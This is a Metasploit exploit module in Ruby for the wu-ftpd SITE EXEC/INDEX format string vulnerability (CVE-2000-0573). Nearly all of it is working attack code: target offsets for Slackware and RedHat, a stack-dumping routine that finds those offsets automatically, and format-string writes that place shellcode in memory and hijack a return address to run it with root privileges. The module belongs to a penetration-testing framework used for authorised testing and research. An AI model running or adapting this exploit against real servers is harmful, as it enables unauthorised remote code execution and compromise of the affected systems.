###
## This file is part of the Metasploit Framework and may be subject to
## redistribution and commercial restrictions. Please see the Metasploit
## Framework web site for more information on licensing and terms of use.
## http://metasploit.com/framework/
###

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	
	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::FormatString
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'wu-ftpd SITE EXEC/INDEX Format String Vulnerability',
			'Description'    => %q{
				This module exploits a format string vulnerability in versions of the
			Washington University FTP server older than 2.6.1. By executing 
			specially crafted SITE EXEC or SITE INDEX commands containing format 
			specifiers, an attacker can corrupt memory and execute arbitrary code.
			},
			'Author'         =>
				[
					'jduck'
				],
			'References'     =>
				[
					['OSVDB', '11805'],
					['CVE', '2000-0573'],
					['BID', '1387']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'PrependChrootBreak' => true
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					# format string max length
					'Space'    => 256,
					# NOTE: \xff's need to be doubled (per ftp/telnet stuff)
					'BadChars' => "\x00\x09\x0a\x0d\x20\x25", 
					'DisableNops'	=>  'True',
					'StackAdjustment' 	=> -1500
				},
			'Platform'       => [ 'linux' ],
			'Targets'        =>
			[
				#
				# Automatic targeting via fingerprinting
				#
				[ 'Automatic Targeting', { 'auto' => true }  ],
				
				#
				# specific targets
				#
				[	'Slackware 2.1 (Version wu-2.4(1) Sun Jul 31 21:15:56 CDT 1994)',
					{
						'UseDPA' 	=> false,
						'PadBytes'	=> 3,
						'NumPops' 	=> 8,
						'Writable' 	=> 0xbfffd026, 	# stack, avoid badchars
						'FlowHook'	=> 0xbffff1e4		# stack return addr
					}
				],
				# these aren't vulnerable (using built-in, stripped down vsprintf)
				#[	'RedHat 5.2 (Version wu-2.4.2-academ[BETA-18](1) Mon Aug 3 19:17:20 EDT 1998)',
				#[	'RedHat 6.0 (Version wu-2.4.2-VR17(1) Mon Apr 19 09:21:53 EDT 1999)',
				#[	'RedHat 6.1 (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999)',
				[	'RedHat 6.2 (Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 2000)',
					{
						'UseDPA' 	=> true,
						'PadBytes'	=> 2,
						'NumPops' 	=> 276,
						'Writable' 	=> 0xbfffd026, 	# stack, avoid badchars
						'FlowHook'	=> 0xbfffb028		# stack return addr
					}
				],
				
				#
				# this one will detect the parameters automagicly
				#
				[	'Debug',
					{
						'UseDPA' 	=> false,
						'PadBytes'	=> 0,
						'NumPops' 	=> 0,
						'Writable' 	=> 0x41414242, 	# 
						'FlowHook'	=> 0x43434545		# 
					}
				],
			],
			'DefaultTarget'  => 0))
		register_options(
			[
				Opt::RPORT(21),
			], self.class )
	end
	
	
	def check
		connect
		disconnect
		print_status("FTP Banner: #{banner}".strip)
		if banner =~ /Version wu-2\.(4|5)/
			return Exploit::CheckCode::Appears
		end
		if banner =~ /Version wu-2\.6\.0/
			return Exploit::CheckCode::Appears
		end
		return Exploit::CheckCode::Safe
	end
	
	
	def exploit
		
		connect_login
		
      # Use a copy of the target
		mytarget = target
		
		if (target['auto'])
			mytarget = nil
			
			print_status("Automatically detecting the target...")
			if (banner and (m = banner.match(/\(Version wu-(.*)\) ready/))) then
				print_status("FTP Banner: #{banner.strip}")
				version = m[1]
			else
				print_status("No matching target")
				return
			end

			regexp = Regexp.escape(version)
			self.targets.each do |t|
				if (t.name =~ /#{regexp}/) then
					mytarget = t
					break
				end
			end
			
			if (not mytarget)
				print_status("No matching target")
				return
			end
			
			print_status("Selected Target: #{mytarget.name}")
		else
			print_status("Trying target #{mytarget.name}...")
			if banner
				print_status("FTP Banner: #{banner.strip}")
			end
		end

		# proceed with chosen target...
		
		# detect stuff!
		if mytarget.name == "Debug"
			# dump the stack, so we can detect stuff magically 
			print_status("Dumping the stack...")
			stack = Array.new
			1000.times do |x|
				# create the most efficient pop string we can...
				str = "aaaabbbb"
				cnt = x
				if (x >= 2)
					str << "%g" * (x/2)
					cnt = (x % 2)
				end
				str << "%x" * cnt
				str << "|"
				str << "%x"
				
				# dont try super long commands
				break if str.length > (512 - (4+1+4+1+2))
				
				if ((res = send_cmd(['SITE', 'EXEC', str], true)))
					if res[0,4] == "500 "
						throw "Crap! Something went wrong while dumping the stack..."
					end
					numstr = res.strip.split(/\r?\n/)[0].split('|')[1]
					dw = numstr.to_i(16)
					stack << dw
				end
			end
			print_status("Obtained #{stack.length*4} bytes of stack data..")
			stack_data = stack.pack('V*')
			
			print_status("stack data:\n" + Rex::Text.to_hex_dump(stack_data))
			
			# detect the number of pad bytes
			idx = stack_data.index("aaaabbbb")
			
			num_pad = 0
			num_pad = 4 - (idx % 4) if (idx % 4)
			mytarget.opts['PadBytes'] = num_pad

			# calculate the number of pops needed to hit our addr
			num_pops = (idx + num_pad) / 4
			mytarget.opts['NumPops'] = num_pops
			
			sc_loc = ((stack[2] & 0xffff0000) | 0xd026)
			mytarget.opts['Writable'] = sc_loc
			
			ret = (stack[99] - 0x828)
			mytarget.opts['FlowHook'] = ret
			
		else
			num_pad = mytarget['PadBytes']
			num_pops = mytarget['NumPops']
			sc_loc = mytarget['Writable']
			ret = mytarget['FlowHook']
		end
		
		sleep(5)
		
		print_status("Number of pad bytes: #{num_pad}")
		print_status("Number of pops: #{num_pops}")
		
		# no extra bytes before the padding..
		num_start = 0
		
		# write shellcode to 'writable'
		arr = fmtstr_gen_array_from_buf(sc_loc, payload.encoded, mytarget)
		
		# process it in groups of 24 (max ~400 bytes per command)
		sc_num = 1
		while arr.length > 0
			print_status("Sending part #{sc_num} of the payload...")
			sc_num += 1
			
			narr = arr.slice!(0..24)

			fmtbuf = fmtstr_gen_from_array(num_start, narr, mytarget)
			# a space allows the next part to start with a '/'
			fmtbuf[num_pad-1,1] = " "
			fmtbuf.gsub!(/\xff/, "\xff\xff")
			if ((res = send_cmd(['SITE', 'EXEC', fmtbuf], true)))
				if res[0,4] == "500 "
					throw "Crap! Something went wrong when uploading the payload..."
				end
			end
		end
		
		
		# write 'writable' addr to flowhook (execute shellcode)
		# NOTE: the resulting two writes must be done at the same time
		print_status("Attempting to write %#x to %#x.." % [sc_loc, ret])
		
		fmtbuf = generate_fmt_two_shorts(num_start, ret, sc_loc, mytarget)
		# a space allows the next part to start with a '/'
		fmtbuf[num_pad-1,1] = " "
		fmtbuf.gsub!(/\xff/, "\xff\xff")
		if (res = send_cmd(['SITE', 'EXEC', fmtbuf], true))
			print_status(res.strip)
		end
		
		print_status("Your payload should have executed now...")
		handler
	end
	  
end
